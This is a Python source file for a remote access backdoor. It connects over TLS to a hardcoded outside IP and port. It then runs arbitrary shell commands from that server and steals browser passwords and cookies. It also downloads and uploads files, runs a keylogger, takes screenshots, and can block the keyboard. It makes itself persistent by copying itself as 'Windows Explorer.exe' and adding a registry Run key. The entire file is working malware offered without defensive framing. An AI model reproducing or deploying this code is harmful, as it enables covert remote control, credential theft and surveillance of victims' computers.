import socket
import subprocess,json
import os
import base64
import ssl
import pyautogui
import tempfile
import keyboard
import sys
import shutil
from Browser import browser
from Keylogger import keylogger

class Backdoor:
    def __init__(self,ip,port):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
        self.context.load_verify_locations('ca.crt')
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
        self.connection.connect((ip,port))
        self.Send("bakara")
        # self.add_persistent()
        # self.keylogger_thread=None
    
    def BrowserData(self,type):
        br=browser()
        if type=='passwords':
            return br.GetPasswords()
        elif type=='cookies':
            return br.GetCookies()
        return '[-] Invalid Browser Command'
    
    def Send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def Receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def AddStartUp(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
            return "[+] Persistence added successfully"
        else:
            return "[-] Persistence already exists"
    
    def RemoveStartUp(self):
        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        if os.path.exists(evil_file_location):
            os.remove(evil_file_location)
            subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
            return "[+] Persistence removed successfully"
        else:
            return "[-] Persistence does not exist"    
    
    def CD_Command(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+path    
    
    def RunShellCommand(self,command):
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    
    def ReadFile(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")   
        
    def WriteFile(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Upload successful"
    
    def KeyLogger(self,command):
        if command == "on":
            NewKeylogger=keylogger()
            self.Keylogger=NewKeylogger
            self.keylogger.on()
        elif command == "off":
            return self.keylogger.off()
        elif command=="report":
            return self.keylogger.report()
        else:
            return "[-] Invalid command"
            
    def Screenshot(self):
        screenshot = pyautogui.screenshot()
        temp_directory = tempfile.gettempdir()
        current_working_directory = os.getcwd()
        os.chdir(temp_directory)
        file_path="screenshot.png"
        screenshot.save(file_path)
        taken_screenshot=self.ReadFile(file_path)
        os.remove(file_path)
        os.chdir(current_working_directory)
        return taken_screenshot
            
    def DisableKeyboard(self):
        for i in range(150):
            keyboard.block_key(i)
        return "[+] Keyboard disabled"
    
    def EnableKeyboard(self):
        for i in range(150):
            keyboard.unblock_key(i)
        return "[+] Keyboard enabled"
        
    def run(self):
        while True:
            try:
                command=self.Receive()
                if command[0]=="exit":
                    self.Send("[-] Exiting")
                    self.connection.close()
                    sys.exit()
                if command[0]=="persistent":
                    if command[1]=="add":
                        command_result=self.AddStartUp()
                    elif command[1]=="remove":
                        command_result=self.RemoveStartUp()
                elif command[0]=="cd" and len(command)>1:
                    command_result=self.CD_Command(command[1])
                elif command[0]=="download":
                    command_result=self.ReadFile(command[1])
                elif command[0]=="upload":
                    command_result=self.WriteFile(command[1],command[2])
                elif command[0]=="keylogger":
                    command_result=self.KeyLogger(command[1])
                elif command[0]=="screenshot":
                    command_result=self.Screenshot()
                elif command[0]=="browser":
                    command_result=self.BrowserData(command[1])
                else:
                    command_result=self.RunShellCommand(command).decode("utf-8")
            except Exception as e:
                command_result="[-] Bakara ERR : \n%s"%str(e)
            self.Send(command_result)

my_backdoor=Backdoor("98.70.78.176",4444)
my_backdoor.run()